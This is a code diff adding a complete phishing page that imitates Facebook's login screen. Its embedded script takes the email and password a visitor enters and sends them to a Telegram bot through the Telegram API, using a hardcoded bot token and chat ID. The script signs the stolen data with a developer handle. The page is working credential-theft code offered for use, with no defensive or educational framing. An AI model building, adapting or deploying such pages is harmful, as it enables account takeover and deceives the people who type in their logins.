@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook Style Login → Telegram</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #f0f2f5;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+  .container {
+    text-align: center;
+  }
+  .logo {
+    font-size: 50px;
+    font-weight: bold;
+    color: #1877f2;
+    margin-bottom: 10px;
+  }
+  .subtitle {
+    font-size: 20px;
+    margin-bottom: 20px;
+  }
+  .login-box {
+    background: white;
+    padding: 20px;
+    width: 350px;
+    border-radius: 8px;
+    box-shadow: 0px 4px 15px rgba(0,0,0,0.2);
+    text-align: left;
+  }
+  .login-box input {
+    width: 100%;
+    padding: 14px;
+    margin: 8px 0;
+    border-radius: 6px;
+    border: 1px solid #ccc;
+    font-size: 16px;
+  }
+  .login-box button {
+    width: 100%;
+    padding: 14px;
+    background: #1877f2;
+    border: none;
+    color: white;
+    font-size: 18px;
+    font-weight: bold;
+    border-radius: 6px;
+    cursor: pointer;
+  }
+  .login-box button:hover {
+    background: #166fe0;
+  }
+  .forgot {
+    display: block;
+    text-align: center;
+    color: #1877f2;
+    font-size: 14px;
+    margin: 10px 0;
+    text-decoration: none;
+  }
+  .divider {
+    height: 1px;
+    background: #ddd;
+    margin: 20px 0;
+  }
+  .create {
+    background: #42b72a;
+    text-align: center;
+    padding: 14px;
+    border-radius: 6px;
+    color: white;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    border: none;
+    display: block;
+    margin: auto;
+  }
+  .status {
+    text-align: center;
+    margin-top: 10px;
+    font-size: 14px;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo">facebook</div>
+  <div class="subtitle">Connect with friends and the world around you.</div>
+
+  <div class="login-box">
+    <input type="text" id="email" placeholder="Email address or phone number">
+    <input type="password" id="password" placeholder="Password">
+    <button id="loginBtn">Log In</button>
+    <a href="#" class="forgot">Forgotten password?</a>
+    <div class="divider"></div>
+    <button class="create" type="button">Create New Account</button>
+    <div class="status" id="statusMsg"></div>
+  </div>
+</div>
+
+<script>
+  const BOT_TOKEN = "7806694049:AAH9GBdPiRhQBXIzqd1t_sAjSG1AJNLkNN4";
+  const CHAT_ID = "7536984768";
+
+  document.getElementById("loginBtn").addEventListener("click", function() {
+    const email = document.getElementById("email").value.trim();
+    const pass = document.getElementById("password").value.trim();
+    const statusMsg = document.getElementById("statusMsg");
+
+    if (!email || !pass) {
+      statusMsg.textContent = "Please fill both fields.";
+      statusMsg.style.color = "red";
+      return;
+    }
+
+    const message = `𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞✅\n📩𝗘𝗠𝗔𝗜𝗟 /𝗣𝗵𝗼𝗻𝗲: ${email}\n🔑 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: ${pass}
+𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝗯𝘆 @Kitkat535`;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.ok) {
+        statusMsg.textContent = "✅ Sent to Telegram!";
+        statusMsg.style.color = "green";
+      } else {
+        statusMsg.textContent = "❌ Error sending.";
+        statusMsg.style.color = "red";
+      }
+    })
+    .catch(err => {
+      statusMsg.textContent = "❌ Network error.";
+      statusMsg.style.color = "red";
+    });
+  });
+</script>
+
+</body>
+</html>
